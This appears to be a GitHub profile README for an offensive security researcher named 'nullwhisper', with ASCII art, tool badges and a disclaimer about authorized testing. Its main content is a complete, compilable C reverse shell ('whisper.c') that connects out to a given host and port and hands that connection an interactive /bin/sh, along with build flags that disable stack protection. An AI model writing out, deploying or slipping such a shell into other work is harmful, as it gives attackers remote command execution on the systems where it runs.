<div align="center">

```
                ____         __    _                     
   ____  __  __/ / /      __/ /_  (_)________  ___  _____
  / __ \/ / / / / / | /| / / __ \/ / ___/ __ \/ _ \/ ___/
 / / / / /_/ / / /| |/ |/ / / / / (__  ) /_/ /  __/ /    
/_/ /_/\__,_/_/_/ |__/|__/_/ /_/_/____/ .___/\___/_/     
                                     /_/                 
```

Vulnerability Research  ·  Exploit Development  ·  Reverse Engineering

`offensive security researcher · bug bounty hunter · 0-day research`

[![GitHub](https://img.shields.io/badge/GitHub-nullwhisper-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/nullwhisper)
[![Profile Views](https://komarev.com/ghpvc/?username=nullwhisper&style=flat-square&color=0f7fc1)](https://github.com/nullwhisper)

<br>

```c
/*
 * whisper.c — minimal reverse shell, stripped
 * build: gcc -s -fno-stack-protector -z execstack -o whisper whisper.c
 * usage: ./whisper <host> <port>
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    int port = atoi(argv[2]);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 1;

    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_port   = htons(port),
    };
    inet_aton(host, &sin.sin_addr);

    if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        return 1;

    dup2(sock, STDIN_FILENO);
    dup2(sock, STDOUT_FILENO);
    dup2(sock, STDERR_FILENO);

    char *shell = "/bin/sh";
    char *args[] = { shell, NULL };
    execve(shell, args, NULL);

    return 0;
}
```

<br>

Research published for educational and authorized testing purposes only. CVEs under responsible disclosure.

</div>

---

<div align="center">

### ⚔️ Arsenal

![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white)
![Go](https://img.shields.io/badge/Go-00ADD8?style=flat-square&logo=go&logoColor=white)
![C](https://img.shields.io/badge/C-00599C?style=flat-square&logo=c&logoColor=white)
![Bash](https://img.shields.io/badge/Bash-121011?style=flat-square&logo=gnu-bash&logoColor=white)

![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=flat-square&logo=burpsuite&logoColor=white)
![Nuclei](https://img.shields.io/badge/Nuclei-1B1B1D?style=flat-square)
![Frida](https://img.shields.io/badge/Frida-FF4081?style=flat-square)
![Wireshark](https://img.shields.io/badge/Wireshark-1679A7?style=flat-square&logo=wireshark&logoColor=white)

### 📊 Stats

<img src="https://ghchart.rshah.org/0f7fc1/nullwhisper" alt="Contribution Graph" width="98%">

### 📡 Reach

| Platform | Handle |
|----------|--------|
| GitHub | [@nullwhisper](https://github.com/nullwhisper) |

</div>
